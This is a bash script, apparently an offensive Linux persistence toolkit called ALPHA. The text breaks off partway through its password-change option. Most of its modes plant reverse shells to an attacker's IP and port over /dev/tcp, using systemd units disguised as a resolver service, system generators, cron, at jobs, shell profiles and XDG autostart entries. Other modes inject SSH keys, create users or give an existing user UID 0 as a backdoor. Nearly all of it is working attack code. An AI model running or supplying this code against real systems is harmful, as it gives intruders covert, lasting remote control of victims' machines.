#!/bin/bash
RED='\033[0;31m'
NC='\033[0m'

print_banner() {
	echo ""
	echo "           __            "
	echo " /\  |    |__) |__|  /\  "
	echo "/~~\ |___ |    |  | /~~\ "
	echo "                         "
	echo ""
}

check_root() {
	if [[ $EUID -ne 0 ]]; then
		return 1
	else
		return 0
	fi
}

usage_user() {
	echo -e "${RED}[!] Warning: More features are available when running as root.${NC}"
	echo ""
	echo "Low Privileged User Options:"
	echo ""
	echo "  --at                  At job persistence"
	echo "  --authorized-keys     Add public key to authorized keys"
	echo "  --bind-shell          Execute backgrounded bind shell"
	echo "  --cron                Cron job persistence"
	echo "  --docker-container    Docker container with host escape (requires docker group permissions)"
	echo "  --git                 Git persistence"
	echo "  --shell-profile       Shell profile persistence"
	echo "  --ssh-key             SSH key persistence"
	echo "  --systemd             Systemd service persistence"
	echo "  --xdg                 XDG autostart persistence"
	echo "  --revert              Revert most changes made by ALPHA's default options"
	echo "  --quiet (-q)          Quiet mode (no banner)"
}

usage_root() {
	echo "Root User Options:"
	echo ""
	echo "  --at                  At job persistence"
	echo "  --authorized-keys     Add public key to authorized keys"
	echo "  --backdoor-user       Create backdoor user"
	echo "  --bind-shell          Execute backgrounded bind shell"
	echo "  --cap                 Add capabilities persistence"
	echo "  --create-user         Create a new user"
	echo "  --cron                Cron job persistence"
	echo "  --docker-container    Docker container with host escape"
	echo "  --generator           Generator persistence"
	echo "  --git                 Git hook/pager persistence"
	echo "  --initd               SysV Init (init.d) persistence"
	echo "  --malicious-package   Build and Install a package for persistence (DNF/RPM)"
	echo "  --motd                Message Of The Day (MOTD) persistence (not available on RHEL derivatives)"
	echo "  --package-manager     Package Manager persistence (APT/YUM/DNF)"
	echo "  --passwd-user         Add user to /etc/passwd directly"
	echo "  --password-change     Change user password"
	echo "  --rc-local            Run Control (rc.local) persistence"
	echo "  --shell-profile       Shell profile persistence"
	echo "  --ssh-key             SSH key persistence"
	echo "  --sudoers             Sudoers persistence"
	echo "  --suid                SUID persistence"
	echo "  --system-binary       System binary persistence"
	echo "  --systemd             Systemd service persistence"
	echo "  --udev                Udev (driver) persistence"
	echo "  --xdg                 XDG autostart persistence"
	echo "  --revert              Revert most changes made by ALPHA's default options"
	echo "  --quiet (-q)          Quiet mode (no banner)"
	echo ""
}

setup_systemd() {
	local service_path=""
	local timer_path=""
	local timer=0
	local command=""
	local custom=0
	local default=0
	local ip=""
	local port=""

	usage_systemd() {
		echo "Usage: ./alpha.sh --systemd [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default systemd settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "--custom                     Use custom systemd settings (make sure they are valid!)"
		echo "  --path <path>                Specify custom service path (must end with .service)"
		echo "  --command <command>          Specify custom persistence command (no validation)"
		echo "  --timer                      Create systemd timer (1 minute interval)"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--path )
				shift
				service_path=$1
				if [[ ! $service_path == *.service ]]; then
					echo "Error: --path must end with .service"
					exit 1
				fi
				;;
			--command )
				shift
				command=$1
				;;
			--timer )
				timer=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./alpha.sh --systemd --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./alpha.sh --systemd --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --path \"/usr/local/lib/systemd/system/evil.service\" --timer"
				exit 0
				;;
			--help|-h)
				usage_systemd
				exit 0
				;;
			* )
				echo "Invalid option for --systemd: $1"
				echo "Try './alpha.sh --systemd --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './alpha.sh --systemd --help' for more information."
		exit 1
	elif [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './alpha.sh --systemd --help' for more information."
			exit 1
		fi

		if check_root; then
			service_path="/usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.service"
			timer_path="/usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.timer"
		else
			local current_user=$(whoami)
			service_path="/home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.service"
			timer_path="/home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.timer"
		fi

		mkdir -p $(dirname "$service_path")
		cat <<-EOF > $service_path
		[Unit]
		Description=Network Name Resolution

		[Service]
		ExecStart=/usr/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'
		Restart=always
		RestartSec=60

		[Install]
		WantedBy=default.target
		EOF

		if check_root; then
		if [ -f /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.service ]; then
			echo "Service file created successfully!"
		else
			echo "Failed to create service file!"
			exit 1
		fi

		else
			if [ -f /home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.service ]; then
				echo "Service file created successfully!"
			else
				echo "Failed to create service file!"
				exit 1
			fi
		fi

		cat <<-EOF > $timer_path
		[Unit]
		Description=Network Name Resolution Timer

		[Timer]
		OnCalendar=*:*:00
		Persistent=true

		[Install]
		WantedBy=timers.target
		EOF

				if check_root; then
			if [ -f /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.timer ]; then
				echo "Timer file created successfully!"
			else
				echo "Failed to create timer file!"
				exit 1
			fi

		else
			if [ -f /home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.timer ]; then
				echo "Timer file created successfully!"
			else
				echo "Failed to create timer file!"
				exit 1
			fi
		fi

		if check_root; then
			systemctl daemon-reload
			systemctl enable $(basename $timer_path)
			systemctl start $(basename $timer_path)
		else
			systemctl --user daemon-reload
			systemctl --user enable $(basename $timer_path)
			systemctl --user start $(basename $timer_path)
		fi

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $service_path || -z $command ]]; then
			echo "Error: --path and --command must be specified when using --custom."
			echo "Try './alpha.sh --systemd --help' for more information."
			exit 1
		fi

		mkdir -p $(dirname "$service_path")
		cat <<-EOF > $service_path
		[Unit]
		Description=Custom Service

		[Service]
		ExecStart=$command
		Restart=always
		RestartSec=60

		[Install]
		WantedBy=default.target
		EOF

		if [ -f $service_path ]; then
			echo "Service file created successfully!"
		else
			echo "Failed to create service file!"
			exit 1
		fi

		if check_root; then
			systemctl daemon-reload
			systemctl enable $(basename $service_path)
			systemctl start $(basename $service_path)
		else
			systemctl --user daemon-reload
			systemctl --user enable $(basename $service_path)
			systemctl --user start $(basename $service_path)
		fi

		if [[ $timer -eq 1 ]]; then
			timer_path="${service_path%.service}.timer"
			mkdir -p $(dirname "$timer_path")
			cat <<-EOF > $timer_path
			[Unit]
			Description=Custom Timer

			[Timer]
			OnCalendar=*:*:00
			Persistent=true

			[Install]
			WantedBy=timers.target
			EOF

			if [ -f $timer_path ]; then
				echo "Timer file created successfully!"
			else
				echo "Failed to create timer file!"
				exit 1
			fi

			if check_root; then
				systemctl daemon-reload
				systemctl enable $(basename $timer_path)
				systemctl start $(basename $timer_path)
			else
				systemctl --user daemon-reload
				systemctl --user enable $(basename $timer_path)
				systemctl --user start $(basename $timer_path)
			fi
		fi
	else
		echo "Error: Either --default or --custom must be specified for --systemd."
		echo "Try './alpha.sh --systemd --help' for more information."
		exit 1
	fi

	echo "[+] Systemd service persistence established!"
}

setup_generator_persistence() {
	local ip=""
	local port=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_generator() {
		echo "Usage: ./alpha.sh --generator [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--ip <ip>                    Specify IP address"
		echo "--port <port>                Specify port number"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--examples )
				echo "Examples:"
				echo "./alpha.sh --generator --ip 10.10.10.10 --port 1337"
				exit 0
				;;
			--help|-h)
				usage_generator
				exit 0
				;;
			* )
				echo "Invalid option for --generator: $1"
				echo "Try './alpha.sh --generator --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $ip || -z $port ]]; then
		echo "Error: --ip and --port must be specified."
		echo "Try './alpha.sh --generator --help' for more information."
		exit 1
	fi

	# Create the /usr/lib/systemd/system-generators/makecon file
	cat <<-EOF > /usr/lib/systemd/system-generators/makecon
	#!/bin/bash
	nohup bash -c "while :; do bash -i >& /dev/tcp/$ip/$port 0>&1; sleep 10; done" &
	EOF

	chmod +x /usr/lib/systemd/system-generators/makecon

	# Create the /usr/lib/systemd/system-generators/generator file
	cat <<-EOF > /usr/lib/systemd/system-generators/generator
	#!/bin/sh
	# Create a systemd service unit file in the late directory
	cat <<-EOL > "/run/systemd/system/generator.service"
	[Unit]
	Description=Generator Service

	[Service]
	ExecStart=/usr/lib/systemd/system-generators/makecon
	Restart=always
	RestartSec=10

	[Install]
	WantedBy=multi-user.target
	EOL

	mkdir -p /run/systemd/system/multi-user.target.wants/
	ln -s /run/systemd/system/generator.service /run/systemd/system/multi-user.target.wants/generator.service

	# Ensure the script exits successfully
	exit 0
	EOF

	chmod +x /usr/lib/systemd/system-generators/generator

	# Reload systemd and enable the generator service
	systemctl daemon-reload
	systemctl enable generator

	echo "[+] Systemd Generator persistence established!"
}

setup_cron() {
	local cron_path=""
	local command=""
	local custom=0
	local default=0
	local ip=""
	local port=""
	local name=""
	local option=""

	if ! command -v crontab &> /dev/null; then
		echo "Error: 'crontab' binary is not present. Please install 'cron' to use this mechanism."
		exit 1
	fi

	usage_cron() {
		if check_root; then
			echo "Usage: ./alpha.sh --cron [OPTIONS]"
			echo "Root User Options:"
			echo "--examples                   Display command examples"
			echo "--default                    Use default cron settings"
			echo "  --ip <ip>                    Specify IP address"
			echo "  --port <port>                Specify port number"
			echo " --custom                     Use custom cron settings"
			echo "   --command <command>          Specify custom persistence command (no validation)"
			echo "   --name <name>                Specify custom cron job name"
			echo "   --crond                      Persist in cron.d directory"
			echo "   --crontab                    Persist in crontab file"
			echo "   --daily                      Persist in cron.daily directory"
			echo "   --hourly                     Persist in cron.hourly directory"
			echo "   --monthly                    Persist in cron.monthly directory"
			echo "   --weekly                     Persist in cron.weekly directory"
		else
			echo "Usage: ./alpha.sh --cron [OPTIONS]"
			echo "Low Privileged User Options:"
			echo "--examples                   Display Cron persistence examples"
			echo "--default                    Use default systemd settings"
			echo "  --ip <ip>                    Specify IP address"
			echo "  --port <port>                Specify port number"
		fi
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--command )
				shift
				command=$1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--crond|--daily|--hourly|--monthly|--weekly )
				if check_root; then
					option=$1
					case $option in
						--crond )
							cron_path="/etc/cron.d"
							;;
						--daily )
							cron_path="/etc/cron.daily"
							;;
						--hourly )
							cron_path="/etc/cron.hourly"
							;;
						--monthly )
							cron_path="/etc/cron.monthly"
							;;
						--weekly )
							cron_path="/etc/cron.weekly"
							;;
					esac
				else
					echo "Error: Only root users can use the $option option."
					exit 1
				fi
				;;
			--crontab )
				if check_root; then
					cron_path="/etc/crontab"
				else
					echo "Error: Only root users can use the --crontab option."
					exit 1
				fi
				;;
			--name )
				shift
				name=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./alpha.sh --cron --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "--daily|--hourly|--monthly|--weekly:"
				echo "sudo ./alpha.sh --cron --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --daily --name \"evil_cron_job\""
				echo ""
				echo "--crond:"
				echo "sudo ./alpha.sh --cron --custom --command \"* * * * * root /bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --crond --name \"evil_cron_job\""
				echo ""
				echo "--crontab:"
				echo "sudo ./alpha.sh --cron --custom --command \"* * * * * /bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --crontab"
				exit 0
				;;
			--help|-h)
				usage_cron
				exit 0
				;;
			* )
				echo "Invalid option: $1"
				echo "Try './alpha.sh --cron --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --default requires --ip and --port."
			echo "Try './alpha.sh --cron --help' for more information."
			exit 1
		fi
		if check_root; then
			cron_path="/etc/cron.d/freedesktop_timesync1"
			command="* * * * * root /bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'"
			echo "$command" > "$cron_path"

		else
			command="* * * * * /bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'"
			(crontab -l 2>/dev/null; echo "$command") | crontab -
		fi
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command ]]; then
			echo "Error: --custom requires --command."
			echo "Try './alpha.sh --cron --help' for more information."
			exit 1
		fi
		if [[ $option == "--daily" || $option == "--hourly" || $option == "--monthly" || $option == "--weekly" ]]; then
			if [[ -z $name ]]; then
				echo "Error: --custom with --daily|--hourly|--monthly|--weekly requires --name."
				echo "Try './alpha.sh --cron --help' for more information."
				exit 1
			fi
			echo -e "#!/bin/bash\n$command" > "$cron_path/$name"
			chmod +x "$cron_path/$name"
		elif [[ $option == "--crond" ]]; then
			if [[ -z $name ]]; then
				echo "Error: --custom with --crond requires --name."
				echo "Try './alpha.sh --cron --help' for more information."
				exit 1
			fi
			echo "$command" > "$cron_path/$name"
		else
			echo "$command" | sudo crontab -
		fi
	else
		echo "Error: Either --default or --custom must be specified for --cron."
		echo "Try './alpha.sh --cron --help' for more information."
		exit 1
	fi

	echo "[+] Cron persistence established."
}

setup_at() {
	local command=""
	local custom=0
	local default=0
	local ip=""
	local port=""
	local time=""

	usage_at() {
		echo "Usage: ./alpha.sh --at [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default at settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "  --time <time>                Specify time for at job (e.g., now + 1 minute)"
		echo "--custom                     Use custom at settings"
		echo "  --command <command>          Specify custom persistence command"
		echo "  --time <time>                Specify time for at job (e.g., now + 1 minute)"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--command )
				shift
				command=$1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--time )
				shift
				time=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./alpha.sh --at --default --ip 10.10.10.10 --port 1337 --time \"now + 1 minute\""
				echo ""
				echo "--custom:"
				echo "sudo ./alpha.sh --at --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --time \"now + 1 minute\""
				exit 0
				;;
			--help|-h)
				usage_at
				exit 0
				;;
			* )
				echo "Invalid option for --at: $1"
				echo "Try './alpha.sh --at --help' for more information."
				exit 1
		esac
		shift
	done

	if ! command -v at &> /dev/null; then
		echo "Error: 'at' binary is not present. Please install 'at' to use this mechanism."
		exit 1
	fi

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './alpha.sh --at --help' for more information."
		exit 1
	elif [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port || -z $time ]]; then
			echo "Error: --ip, --port, and --time must be specified when using --default."
			echo "Try './alpha.sh --at --help' for more information."
			exit 1
		fi
		echo "/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'" | at $time
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command || -z $time ]]; then
			echo "Error: --command and --time must be specified when using --custom."
			echo "Try './alpha.sh --at --help' for more information."
			exit 1
		fi
		echo "$command" | at $time
	else
		echo "Error: Either --default or --custom must be specified for --at."
		echo "Try './alpha.sh --at --help' for more information."
		exit 1
	fi

	echo "[+] At job persistence established!"
}

setup_shell_profile() {
	local profile_path=""
	local command=""
	local custom=0
	local default=0
	local ip=""
	local port=""

	usage_shell_profile() {
		echo "Usage: ./alpha.sh --shell-profile [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default shell profile settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "--custom                     Use custom shell profile settings (make sure they are valid!)"
		echo "  --path <path>                Specify custom profile path"
		echo "  --command <command>          Specify custom persistence command (no validation)"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--path )
				shift
				profile_path=$1
				;;
			--command )
				shift
				command=$1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./alpha.sh --shell-profile --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./alpha.sh --shell-profile --custom --command \"(nohup bash -i > /dev/tcp/10.10.10.10/1337 0<&1 2>&1 &)\" --path \"/root/.bash_profile\""
				exit 0
				;;
			--help|-h)
				usage_shell_profile
				exit 0
				;;
			* )
				echo "Invalid option for --shell-profile: $1"
				echo "Try './alpha.sh --shell-profile --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './alpha.sh --shell-profile --help' for more information."
		exit 1
	elif [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './alpha.sh --shell-profile --help' for more information."
			exit 1
		fi

		if check_root; then
			profile_path="/etc/profile"
		else
			local current_user=$(whoami)
			profile_path="/home/$current_user/.bash_profile"
		fi

		echo "(nohup bash -i > /dev/tcp/$ip/$port 0<&1 2>&1 &)" >> $profile_path
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $profile_path || -z $command ]]; then
			echo "Error: --path and --command must be specified when using --custom."
			echo "Try './alpha.sh --shell-profile --help' for more information."
			exit 1
		fi

		echo "$command" >> $profile_path
	else
		echo "Error: Either --default or --custom must be specified for --profile."
		echo "Try './alpha.sh --shell-profile --help' for more information."
		exit 1
	fi

	echo "[+] Shell profile persistence established!"
}

setup_xdg() {
	if [[ ! -d "/etc/xdg" ]]; then
		echo "Warning: /etc/xdg directory does not exist. XDG might not be present on this system."
	fi

	usage_xdg() {
		echo "Usage: ./alpha.sh --xdg [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default xdg settings"
		echo "  --ip <ip>                  Specify IP address"
		echo "  --port <port>              Specify port number"
		echo "--custom                     Use custom xdg settings (make sure they are valid!)"
		echo "  --path <path>                Specify custom desktop entry path"
		echo "  --command <command>          Specify custom persistence command"
	}

	local profile_path=""
	local command=""
	local custom=0
	local default=0
	local ip=""
	local port=""

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--path )
				shift
				profile_path=$1
				;;
			--command )
				shift
				command=$1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./alpha.sh --xdg --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./alpha.sh --xdg --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --path \"/etc/xdg/autostart/evilxdg.desktop\""
				exit 0
				;;
			--help|-h)
				usage_xdg
				exit 0
				;;
			* )
				echo "Invalid option for --xdg: $1"
				echo "Try './alpha.sh --xdg --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './alpha.sh --xdg --help' for more information."
		exit 1
	elif [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './alpha.sh --xdg --help' for more information."
			exit 1
		fi

		if check_root; then
			profile_path="/etc/xdg/autostart/pkc12-register.desktop"
			command="/etc/xdg/pkc12-register"
			mkdir -p /etc/xdg/autostart
			echo -e "[Desktop Entry]\nType=Application\nExec=$command\nName=pkc12-register" > $profile_path
			echo -e "#!/bin/bash\n/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'" > $command
			chmod +x $command
		else
			local current_user=$(whoami)
			profile_path="/home/$current_user/.config/autostart/user-dirs.desktop"
			command="/home/$current_user/.config/autostart/.user-dirs"
			mkdir -p /home/$current_user/.config/autostart
			echo -e "[Desktop Entry]\nType=Application\nExec=$command\nName=user-dirs" > $profile_path
			echo -e "#!/bin/bash\n/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'" > $command
			chmod +x $command
		fi

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $profile_path || -z $command ]]; then
			echo "Error: --file and --command must be specified when using --custom."
			echo "Try './alpha.sh --xdg --help' for more information."
			exit 1
		fi

		if check_root; then
			local exec_path=${profile_path%.desktop}
			echo -e "[Desktop Entry]\nType=Application\nExec=$exec_path\nName=$(basename $exec_path)" > $profile_path
			echo -e "#!/bin/bash\n$command" > $exec_path
			chmod +x $exec_path
		else
			local current_user=$(whoami)
			profile_path="/home/$current_user/.config/autostart/$(basename $profile_path)"
			local exec_path="/home/$current_user/.config/autostart/$(basename ${profile_path%.desktop})"
			mkdir -p /home/$current_user/.config/autostart
			echo -e "[Desktop Entry]\nType=Application\nExec=$exec_path\nName=$(basename $exec_path)" > $profile_path
			echo -e "#!/bin/bash\n$command" > $exec_path
			chmod +x $exec_path
		fi
	else
		echo "Error: Either --default or --custom must be specified for --xdg."
		echo "Try './alpha.sh --xdg --help' for more information."
		exit 1
	fi

	echo "[+] XDG persistence established!"
}

setup_ssh_key() {
	local default=0
	local custom=0
	local target_user=""
	local ssh_dir=""
	local ssh_key_path=""

	usage_ssh_key() {
		if check_root; then
			echo "Usage: ./alpha.sh --ssh-key [OPTIONS]"
			echo "Root User Options:"
			echo "--examples                   Display command examples"
			echo "--default                    Use default SSH key settings"
			echo "--custom                     Use custom SSH key settings"
			echo "  --user <user>               Specify user for custom SSH key"
		else
			echo "Usage: ./alpha.sh --ssh-key [OPTIONS]"
			echo "Low Privileged User Options:"
			echo "--examples                   Display command examples"
			echo "--default                    Use default SSH key settings"
		fi
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--user )
				shift
				target_user=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./alpha.sh --ssh-key --default"
				echo ""
				echo "--custom:"
				echo "sudo ./alpha.sh --ssh-key --custom --user victim"
				exit 0
				;;
			--help|-h)
				usage_ssh_key
				exit 0
				;;
			* )
				echo "Invalid option for --ssh-key: $1"
				echo "Try './alpha.sh --ssh-key --help' for more information."
				exit 1
		esac
		shift
	done

	if ! command -v ssh-keygen &> /dev/null; then
		echo "Error: 'ssh-keygen' is not installed. Please install it to use this feature."
		exit 1
	fi

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './alpha.sh --ssh-key --help' for more information."
		exit 1
	elif [[ $default -eq 1 ]]; then
		if check_root; then
			ssh_dir="/root/.ssh"
			ssh_key_path="$ssh_dir/id_rsa1822"
		else
			local current_user=$(whoami)
			ssh_dir="/home/$current_user/.ssh"
			ssh_key_path="$ssh_dir/id_rsa1822"
		fi

		mkdir -p $ssh_dir
		ssh-keygen -t rsa -b 2048 -f $ssh_key_path -N "" -q
		cat $ssh_key_path.pub >> $ssh_dir/authorized_keys
		echo "SSH key generated:"
		echo "Private key: $ssh_key_path"
		echo "Public key: ${ssh_key_path}.pub"

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $target_user ]]; then
			echo "Error: --user must be specified when using --custom."
			echo "Try './alpha.sh --ssh-key --help' for more information."
			exit 1
		fi

		if id -u $target_user &>/dev/null; then
			local user_home=$(eval echo ~$target_user)
			ssh_dir="$user_home/.ssh"
			ssh_key_path="$ssh_dir/id_rsa1822"

			mkdir -p $ssh_dir
			chown $target_user:$target_user $ssh_dir
			sudo -u $target_user ssh-keygen -t rsa -b 2048 -f $ssh_key_path -N "" -q
			cat $ssh_key_path.pub >> $ssh_dir/authorized_keys
			chown $target_user:$target_user $ssh_key_path $ssh_key_path.pub $ssh_dir/authorized_keys
			echo "SSH key generated for $target_user:"
			echo "Private key: $ssh_key_path"
			echo "Public key: ${ssh_key_path}.pub"
		else
			echo "Error: User $target_user does not exist."
			exit 1
		fi
	else
		echo "Error: Either --default or --custom must be specified for --ssh-key."
		echo "Try './alpha.sh --ssh-key --help' for more information."
		exit 1
	fi

	echo "[+] SSH key persistence established!"
}

setup_authorized_keys() {
	local key=""
	local path=""
	local default=0
	local custom=0

	usage_authorized_keys() {
		if check_root; then
			echo "Usage: ./alpha.sh --authorized-keys [OPTIONS]"
			echo "Root User Options:"
			echo "--examples                   Display command examples"
			echo "--default                    Use default authorized keys settings"
			echo "  --key <key>                  Specify the public key"
			echo "--custom                     Use custom authorized keys settings"
			echo "  --key <key>                  Specify the public key"
			echo "  --path <path>                Specify custom authorized keys file path"
		else
			echo "Usage: ./alpha.sh --authorized-keys [OPTIONS]"
			echo "Low Privileged User Options:"
			echo "--examples                   Display command examples"
			echo "--default                    Use default authorized keys settings"
			echo "  --key <key>                  Specify the public key"
		fi
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--key )
				shift
				key=$1
				;;
			--path )
				shift
				path=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./alpha.sh --authorized-keys --default --key <public_key>"
				echo ""
				echo "--custom:"
				echo "sudo ./alpha.sh --authorized-keys --custom --key <public_key> --path /home/user/.ssh/authorized_keys"
				exit 0
				;;
			--help|-h)
				usage_authorized_keys
				exit 0
				;;
			* )
				echo "Invalid option for --authorized-keys: $1"
				echo "Try './alpha.sh --authorized-keys --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './alpha.sh --authorized-keys --help' for more information."
		exit 1
	elif [[ -z $key ]]; then
		echo "Error: --key must be specified."
		echo "Try './alpha.sh --authorized-keys --help' for more information."
		exit 1
	fi

	if check_root; then
		if [[ $default -eq 1 ]]; then
			path="/root/.ssh/authorized_keys"
		elif [[ $custom -eq 1 && -n $path ]]; then
			mkdir -p $(dirname $path)
		else
			echo "Error: --path must be specified with --custom for root."
			echo "Try './alpha.sh --authorized-keys --help' for more information."
			exit 1
		fi
	else
		if [[ $default -eq 1 ]]; then
			local current_user=$(whoami)
			path="/home/$current_user/.ssh/authorized_keys"
		else
			echo "Error: Only root can use --custom for --authorized-keys."
			echo "Try './alpha.sh --authorized-keys --help' for more information."
			exit 1
		fi
	fi

	mkdir -p $(dirname $path)
	echo $key >> $path
	chmod 600 $path

	echo "[+] Authorized_keys persistence established!"
}

setup_new_user() {
	local username=""
	local password=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_create_user() {
		echo "Usage: ./alpha.sh --create-user [OPTIONS]"
		echo "--examples                 Display command examples"
		echo "--username <username>      Specify the username"
		echo "--password <password>      Specify the password"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--username )
				shift
				username=$1
				;;
			--password )
				shift
				password=$1
				;;
			--examples )
				echo "Examples:"
				echo "sudo ./alpha.sh --create-user --username <username> --password <password>"
				exit 0
				;;
			--help|-h)
				usage_create_user
				exit 0
				;;
			* )
				echo "Invalid option for --create-user: $1"
				echo "Try './alpha.sh --create-user --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $username || -z $password ]]; then
		echo "Error: --username and --password must be specified."
		echo "Try './alpha.sh --create-user --help' for more information."
		exit 1
	fi

	useradd -M $username
	echo "$username:$password" | chpasswd

	echo "[+] User persistence through the new $username user established!"
}

setup_backdoor_user() {
	local username=""

	usage_backdoor_user() {
		echo "Usage: ./alpha.sh --backdoor-user [OPTIONS]"
		echo "--examples                 Display command examples"
		echo "--username <username>      Specify the username"
	}

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	while [[ "$1" != "" ]]; do
		case $1 in
			--username )
				shift
				username=$1
				;;
			--examples )
				echo "Examples:"
				echo "sudo ./alpha.sh --backdoor-user --username <username>"
				exit 0
				;;
			--help|-h)
				usage_backdoor_user
				exit 0
				;;
			* )
				echo "Invalid option for --backdoor-user: $1"
				echo "Try './alpha.sh --backdoor-user --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $username ]]; then
		echo "Error: --username must be specified."
		echo "Try './alpha.sh --backdoor-user --help' for more information."
		exit 1
	fi

	usermod -u 0 -o $username

	if [[ $? -eq 0 ]]; then
		echo "[+] User $username has been modified to have UID 0 (root privileges)."
	else
		echo "[-] Failed to modify user $username."
		exit 1
	fi
	echo "[+] Backdoor user persistence established!"
}

setup_password_change() {
	local username=""
	local password=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_password_change() {
		echo "Usage: ./alpha.sh --password-change [OPTIONS]"
		echo "--examples                 Display command examples"
		echo "--username <username>      Specify the username"
		echo "--password <password>      Specify the new password"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--username )
				shift
				username=$1
				;;
